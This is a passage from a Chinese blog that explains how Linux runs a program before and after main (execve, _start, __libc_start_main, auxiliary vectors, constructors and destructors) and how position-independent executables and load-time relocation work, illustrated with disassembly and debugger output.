            <a href="/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">Principles：main函数执行前后的流程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-04 23:03:24 / Modified: 23:06:09" itemprop="dateCreated datePublished" datetime="2022-09-04T23:03:24+08:00">2022-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>execve</strong></p>
<p>当 shell 中的那一段命令按下时，一个程序开始执行，shell 或者 GUI 会调用 execve()</p>
<ul>
<li>系统会为你设置栈，并且将 <code>argc</code>，<code>argv</code> 和 <code>envp</code> 压入栈中</li>
<li>对于文件描述符 0，1 和 2（stdin，stdout 和 stderr）则保留 shell 之前的设置</li>
<li>加载器会帮你完成重定位，调用你设置的 <strong>预初始化函数</strong></li>
<li>最后，控制权会传递给 <code>_start()</code> </li>
</ul>
<p><strong>_start</strong></p>
<p><code>_start</code> 的反汇编如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                              <span class="keyword">public</span> _start</span><br><span class="line">                              _start proc near                      </span><br><span class="line">                              ; __unwind &#123;</span><br><span class="line">F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line"><span class="number">31</span> ED                         <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line"><span class="number">49</span> <span class="number">89</span> D1                      mov     r9, rdx                         ; rtld_fini</span><br><span class="line"><span class="number">5</span>E                            pop     rsi                             ; argc</span><br><span class="line"><span class="number">48</span> <span class="number">89</span> E2                      mov     rdx, rsp                        ; ubp_av</span><br><span class="line"><span class="number">48</span> <span class="number">83</span> E4 F0                   <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line"><span class="number">50</span>                            push    rax</span><br><span class="line"><span class="number">54</span>                            push    rsp                             ; stack_end</span><br><span class="line"><span class="number">49</span> C7 C0 <span class="number">20</span> <span class="number">12</span> <span class="number">40</span> <span class="number">00</span>          mov     r8, offset __libc_csu_fini      ; fini</span><br><span class="line"><span class="number">48</span> C7 C1 B0 <span class="number">11</span> <span class="number">40</span> <span class="number">00</span>          mov     rcx, offset __libc_csu_init     ; init</span><br><span class="line"><span class="number">48</span> C7 C7 <span class="number">56</span> <span class="number">11</span> <span class="number">40</span> <span class="number">00</span>          mov     rdi, offset main                ; main</span><br><span class="line">FF <span class="number">15</span> <span class="number">52</span> <span class="number">2F</span> <span class="number">00</span> <span class="number">00</span>             call    cs:__libc_start_main_ptr</span><br><span class="line"></span><br><span class="line">F4                            hlt</span><br><span class="line">                              _start endp</span><br></pre></td></tr></table></figure>
<p><code>_start</code> 中会调用 <code>_libc_start_main</code>，它的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">                <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">                <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure>
<p><strong>__libc_start_main</strong></p>
<p><code>__libc_start_main</code> 函数的参数中没有 envp（<code>main</code> 中的第三个参数，envp 这个数组包含许多的指针，当中每个指针指向的是系统中的环境变量），因此会调用 <code>__libc_init_first</code> 使用内部信息去找到环境变量</p>
<ul>
<li>环境变量（environment variables）：一般是指在操作系统中用来指定操作系统运行环境的一些参数，环境变量可以使系统运行环境配置更加简单灵活，可以通过设置环境变量给进程传递参数信息<ul>
<li>PATH：指定命令的搜索路径</li>
<li>HOME：当前用户的主工作目录（即 Linux 登录时，默认的目录）</li>
<li>SHELL：当前 shell，它的值是通常是 <code>/bin/shell</code></li>
</ul>
</li>
<li>Linux 为什么要有环境变量：<ul>
<li>因为 Linux 执行一些命令时，它会去很多目录去搜索对应的可执行程序</li>
<li>如果可执行程序分散在不同的目录下，当搜索时，这样会非常的耗费时间</li>
<li>所以 Linux 就约定，当执行一个命令时，就到一个指定的文件中去寻找可执行程序所在的目录，这个指定的文件就是环境变量配置文件</li>
</ul>
</li>
<li>可以用 GDB 打印一下 argv &amp; envp：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffdfc8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0x7fffffffdfc8</span> —▸ <span class="number">0x7fffffffe31a</span> ◂— <span class="number">0x68792f656d6f682f</span> (<span class="string">&#x27;/home/yh&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdfd0</span> —▸ <span class="number">0x7fffffffe338</span> ◂— <span class="number">0x33323100636261</span> <span class="comment">/* &#x27;abc&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffdfd8</span> —▸ <span class="number">0x7fffffffe33c</span> ◂— <span class="number">0x5f48535300333231</span> <span class="comment">/* &#x27;123&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffdfe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rdx <span class="number">0x7fffffffdfe8</span> —▸ <span class="number">0x7fffffffe340</span> ◂— <span class="string">&#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdff0</span> —▸ <span class="number">0x7fffffffe369</span> ◂— <span class="string">&#x27;SESSION_MANAGER=local/yhellow-virtual-machine:@/tmp/.ICE-unix/1824,unix/yhellow-virtual-machine:/tmp/.ICE-unix/1824&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffdff8</span> —▸ <span class="number">0x7fffffffe3dd</span> ◂— <span class="string">&#x27;GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/f60ef9cf_9126_4c39_b1ee_af08e3e804a7&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fffffffe000</span> —▸ <span class="number">0x7fffffffe433</span> ◂— <span class="string">&#x27;SSH_AGENT_PID=1557&#x27;</span></span><br></pre></td></tr></table></figure>
<p>当 <code>envp</code> 建立了之后，<code>__libc_start_main</code> 函数会使用相同的小技巧，越过 envp 数组之后的 <code>NULL</code> 字符，获取另一个向量：ELF 辅助向量（ELF 加载器使用它给进程传递一些信息）</p>
<ul>
<li>ELF 辅助向量（Auxiliary Vectors）是 <strong>将某些内核级信息传输到用户进程的机制</strong>（例如：指向[系统调用]入口点的指针-<code>AT_SYSINFO</code>）</li>
</ul>
<p>设置环境变量 <code>LD_SHOW_AUXV=1</code> 就可以查看 ELF 辅助向量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> LD_SHOW_AUXV=<span class="number">1</span> ./main </span><br><span class="line">AT_SYSINFO_EHDR:      <span class="number">0x7ffc4a3f3000</span></span><br><span class="line">AT_??? (<span class="number">0x33</span>): <span class="number">0xe30</span></span><br><span class="line">AT_HWCAP:             f8bfbff</span><br><span class="line">AT_PAGESZ:            <span class="number">4096</span></span><br><span class="line">AT_CLKTCK:            <span class="number">100</span></span><br><span class="line">AT_PHDR:              <span class="number">0x555c45893040</span></span><br><span class="line">AT_PHENT:             <span class="number">56</span></span><br><span class="line">AT_PHNUM:             <span class="number">13</span></span><br><span class="line">AT_BASE:              <span class="number">0x7fd1cbb48000</span></span><br><span class="line">AT_FLAGS:             <span class="number">0x0</span></span><br><span class="line">AT_ENTRY:             <span class="number">0x555c458941c0</span></span><br><span class="line">AT_UID:               <span class="number">1000</span></span><br><span class="line">AT_EUID:              <span class="number">1000</span></span><br><span class="line">AT_GID:               <span class="number">1000</span></span><br><span class="line">AT_EGID:              <span class="number">1000</span></span><br><span class="line">AT_SECURE:            <span class="number">0</span></span><br><span class="line">AT_RANDOM:            <span class="number">0x7ffc4a3e5899</span></span><br><span class="line">AT_HWCAP2:            <span class="number">0x2</span></span><br><span class="line">AT_EXECFN:            ./main</span><br><span class="line">AT_PLATFORM:          x86_64</span><br></pre></td></tr></table></figure>
<ul>
<li><code>AT_ENTRY</code> 就是 <code>_start</code> 的地址，<code>AT_PHDR</code> 是 ELF program header 的位置，<code>AT_PHENT</code> 是header entry 的字节数 ，还输出了 UID、UID 和 GID</li>
<li>这些都是内核态才能拿到的数据，但是用户态程序又需要这些数据，于是就通过 ELF 辅助向量将这些信息传输给用户态进程</li>
</ul>
<p>当进程获取到必要的数据后，就会执行 <code>__libc_start_main</code> 函数的主要功能：</p>
<ul>
<li>处理关于 <code>setuid、setgid</code> 程序的安全问题</li>
<li>启动线程</li>
<li>把 <code>fini</code> 函数（实际上是 <code>__libc_csu_fini</code>）和 <code>rtld_fini</code> 函数作为参数传递给 <code>at_exit</code> 调用（使它们在 <code>at_exit</code> 里被调用，从而完成用户程序和加载器的调用结束之后的清理工作）</li>
<li>调用其 <code>init</code> 参数（实际上是执行 <code>__libc_csu_init</code> 函数）</li>
<li>调用 <code>main</code> 函数，并把 <code>argc</code> 和 <code>argv</code> 参数、环境变量传递给它</li>
<li>调用 <code>exit</code> 函数（会在其中调用 <code>__libc_csu_fini</code>），并将 <code>main</code> 函数的返回值传递给它</li>
</ul>
<p><strong><strong>libc_csu_init &amp; </strong>libc_csu_fini</strong></p>
<p>对于任意的可执行程序都可以有一个C函数的“构造函数” <code>__libc_csu_init</code> 和C函数的“析构函数” <code>__libc_csu_fini</code>，在构造函数内部，可执行程序会找到全局C函数组成的构造函数集，并且调用它们</p>
<p>构造函数和析构函数是 Cpp 中的概念：</p>
<ul>
<li>构造函数：是一种特殊的函数，用来在对象实例化的时候初始化对象的成员变量</li>
<li>析构函数：是构造函数的互补，当对象超出作用域或动态分配的对象被删除时，将自动调用析构函数 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>: <span class="comment">/* 构造函数/析构函数都要放到public中 */</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setLength</span><span class="params">(<span class="keyword">double</span> len)</span></span>;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">getLength</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">      <span class="built_in">Line</span>();   <span class="comment">/* 这是构造函数声明(与类名相同) */</span></span><br><span class="line">      ~<span class="built_in">Line</span>();  <span class="comment">/* 这是析构函数声明(与类名相同,在前面加~) */</span></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="keyword">double</span> length;</span><br><span class="line">&#125;;</span><br><span class="line">Line::<span class="built_in">Line</span>(<span class="keyword">void</span>)&#123; <span class="comment">/* 构造函数的定义 */</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Object is being created&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">Line::~<span class="built_in">Line</span>(<span class="keyword">void</span>)&#123; <span class="comment">/* 析构函数的定义 */</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Object is being deleted&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Line::setLength</span><span class="params">(<span class="keyword">double</span> len)</span></span>&#123;</span><br><span class="line">    length = len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Line::getLength</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Line line; <span class="comment">/* 执行构造函数 */</span></span><br><span class="line">   line.<span class="built_in">setLength</span>(<span class="number">6</span>);</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Length of line : &quot;</span> &lt;&lt; line.<span class="built_in">getLength</span>() &lt;&lt;endl; </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* 执行析构函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object is being created</span><br><span class="line">Length of line : <span class="number">6</span></span><br><span class="line">Object is being deleted</span><br></pre></td></tr></table></figure>
<p>C 语言没有构造函数和析构函数的概念，但 gcc 为函数提供了几种类型的属性，其中包含：</p>
<ul>
<li>构造函数(constructors)：<code>static void start(void) __attribute__ ((constructor))</code></li>
<li>析构函数(destructors)：<code>static void stop(void) __attribute__ ((destructor))</code></li>
<li>带有“构造函数”属性的函数将在 <code>main</code> 函数之前被执行，而声明为“析构函数”属性的函数则将在 <code>main</code> 退出时执行（其实就有点像针对 <code>main</code> 的构造函数）</li>
</ul>
<p>源码如下：（根据 IDA 反编译出来的代码改的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _libc_csu_init()&#123;</span><br><span class="line">    init_proc(); <span class="comment">/* 初始化 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> size = &amp;_do_global_dtors_aux_fini_array_entry - &amp;_frame_dummy_init_array_entry;</span><br><span class="line">    <span class="keyword">if</span> (size)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0LL</span>; i != size; ++i)</span><br><span class="line">            <span class="comment">/* 遍历并调用&#x27;_frame_dummy_init_array_entry+i&#x27;中的函数 */</span></span><br><span class="line">            (*(&amp;_frame_dummy_init_array_entry + i))();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_frame_dummy_init_array_entry</code> 中的数据如下：（提前写好了“构造函数”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.init_array:<span class="number">0000000000003</span>D88 <span class="number">40</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       __frame_dummy_init_array_entry dq offset frame_dummy</span><br><span class="line">.init_array:<span class="number">0000000000003</span>D90 <span class="number">49</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a_constructor</span><br><span class="line">.init_array:<span class="number">0000000000003</span>D98 <span class="number">60</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset b_constructor</span><br><span class="line">.init_array:<span class="number">0000000000003</span>DA0 <span class="number">77</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset c_constructor</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_do_global_dtors_aux_fini_array_entry</code> 中的数据如下：（提前写好了“析构函数”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:<span class="number">0000000000003</span>DA8 <span class="number">00</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       __do_global_dtors_aux_fini_array_entry dq offset __do_global_dtors_aux</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DB0 <span class="number">8</span>E <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset A_destructor</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DB8 A5 <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset B_destructor</span><br><span class="line">.fini_array:<span class="number">0000000000003</span>DC0 BC <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset C_destructor</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>main 函数执行前后的流程</strong></p>
<p>函数调用关系图：</p>
<img src="/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/1662295532372.png" class width="1662295532372"> 
<ul>
<li>首先程序调用 execve 生成一个进程，并且设置好数据</li>
<li>然后调用 <code>_start</code> 简单设置后就调用 <code>__libc_start_main</code></li>
<li><code>__libc_start_main</code> 会先调用 <code>__libc_init_first</code> 获取环境变量 envp（作为 main 的第三个参数），然后越过 envp 数组之后的 <code>NULL</code> 字符，获取 ELF 辅助向量</li>
<li>把 <code>fini</code> 和 <code>rtld_fini</code> 作为参数传递给 <code>at_exit</code> 调用</li>
<li>调用其 <code>init</code> 参数，执行 <code>__libc_csu_init</code></li>
<li>调用 <code>main</code> 函数，并把 <code>argc</code> 和 <code>argv</code> 参数、环境变量传递给它</li>
<li>调用 <code>exit</code> 函数，执行其中的 <code>__libc_csu_fini</code></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：PIE原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-04 16:43:42 / Modified: 16:47:55" itemprop="dateCreated datePublished" datetime="2022-09-04T16:43:42+08:00">2022-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="基础对比"><a href="#基础对比" class="headerlink" title="基础对比"></a>基础对比</h2><p><strong>先对比一下 [只开启PIE] 和 [关闭所有保护] 的程序反汇编</strong></p>
<img src="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/1662132275958.png" class width="1662132275958">  
<ul>
<li>关闭 PIE：多一个名为 <code>dl_relocate_static_pie</code> 的函数</li>
<li>开启 PIE：多了 <code>__cxa_finalize</code> 和 <code>__imp___cxa_finalize</code></li>
</ul>
<p><strong>再对比一下 GDB 调试两个文件效果</strong></p>
<img src="/2022/09/04/Principles%EF%BC%9APIE%E5%8E%9F%E7%90%86/1662126627604.png" class width="1662126627604"> 
<ul>
<li>就是基地址不同（存储在 CS 寄存器中）</li>
</ul>
<h2 id="PIE-简述"><a href="#PIE-简述" class="headerlink" title="PIE 简述"></a>PIE 简述</h2><p>PIE（position-independent executable）是一种生成地址无关可执行程序的技术，它属于ASLR（Address space layout randomization）的一部分，ASLR 要求执行程序被加载到内存时，它其中的任意部分都是随机的</p>
<p>作用：</p>
<ul>
<li>提高缓冲区溢出攻击的门槛：<ul>
<li>ASLR 要求执行程序被加载到内存时，它其中的任意部分都是随机的</li>
<li>包括：Stack，Heap，Libs and mmap，Executable，Linker，VDSO</li>
</ul>
</li>
<li>提高内存使用效率（更多指 PIC）：<ul>
<li>一个共享库可以同时被多个进程装载，如果不是地址无关代码（代码段中存在绝对地址引用），每个进程必须结合其自生的内存地址调用动态链接库</li>
<li>导致不得不将共享库整体拷贝到进程中，如果系统中有100个进程调用这个库，就会有100份该库的拷贝在内存中，这会照成极大的空间浪费</li>
<li>相反如果被加载的共享库是地址无关代码，100个进程调用该库，则该库只需要在内存中加载一次</li>
<li>这是因为 PIE 将共享库中代码段须要变换的内容分离到数据段，使得代码段加载到内存时能做到地址无关，多个进程调用共享库时只需要在自己的进程中加载共享库的数据段，而代码段则可以共享</li>
</ul>
</li>
</ul>
<h2 id="PIE-的由来"><a href="#PIE-的由来" class="headerlink" title="PIE 的由来"></a>PIE 的由来</h2><p>PIE 源自于 PIC，因此我们需要先了解一些共享库的知识：</p>
<p>将共享库(.so)载入程序地址空间时需要特殊的处理，简而言之，在链接器创建共享库时，链接器不能对它们的代码假设一个已知的载入地址（因为每个程序可以使用任意多的共享库，没有一个简单的方法预先知道给定的共享库将被载入虚拟内存的什么位置）</p>
<p>在 Linux ELF 共享库里解决这个问题有两个主要途径：</p>
<ul>
<li>载入时重定位（load-time relocation）</li>
<li>位置无关代码（PIC）</li>
</ul>
<p><strong>载入时重定位</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -Mintel libmlreloc.so</span><br><span class="line"></span><br><span class="line">libmlreloc.so:     fileformat elf32-i386</span><br><span class="line"></span><br><span class="line">[...] skipping stuff</span><br><span class="line">000004a7 &lt;ml_func&gt;:</span><br><span class="line"> 4a7:   55                      push   ebp</span><br><span class="line"> 4a8:   89 e5                   mov    ebp,esp</span><br><span class="line"> 4aa:   83 ec 14                sub    esp,0x14</span><br><span class="line"> 4ad:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line"> 4b0:   89 04 24                mov    DWORD PTR [esp],eax</span><br><span class="line"> 4b3:   e8 fc ff ff ff          call   4b4 &lt;ml_func+0xd&gt;</span><br><span class="line"> 4b8:   03 45 0c                add    eax,DWORD PTR [ebp+0xc]</span><br><span class="line"> 4bb:   89 45 fc                mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line"> 4be:   a1 00 00 00 00          mov    eax,ds:0x0</span><br><span class="line"> 4c3:   03 45 fc                add    eax,DWORD PTR [ebp-0x4]</span><br><span class="line"> 4c6:   a3 00 00 00 00          mov    ds:0x0,eax</span><br><span class="line"> 4cb:   a1 00 00 00 00          mov    eax,ds:0x0</span><br><span class="line"> 4d0:   03 45 0c                add    eax,DWORD PTR [ebp+0xc]</span><br><span class="line"> 4d3:   c9                      leave</span><br><span class="line"> 4d4:   c3                      ret</span><br><span class="line">[...] skipping stuff</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现重定位并没有完成：<ul>
<li><code>mov myglob</code> 处的偏移任然是“0”</li>
<li><code>call ml_util_func</code> 处的偏移是“0xfffffffc”</li>
</ul>
</li>
</ul>
<p>创建一个特殊的重定位项指向这个位置：</p>
